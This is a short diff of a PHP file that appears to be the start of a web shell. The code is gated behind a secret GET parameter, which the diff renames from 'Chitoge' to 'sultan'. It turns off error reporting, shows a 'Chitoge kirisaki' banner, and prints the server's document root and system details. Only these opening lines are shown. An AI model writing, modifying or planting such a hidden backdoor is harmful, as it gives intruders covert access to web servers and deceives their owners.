@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 
-if(isset($_GET["Chitoge"])) {
+if(isset($_GET["sultan"])) {
 	$root = $_SERVER['DOCUMENT_ROOT'];
 	echo "<h1><i>Chitoge kirisaki <3</i></h1><br>";
 	echo "<b><phpuname>".php_uname()."</phpuname></b><br>";
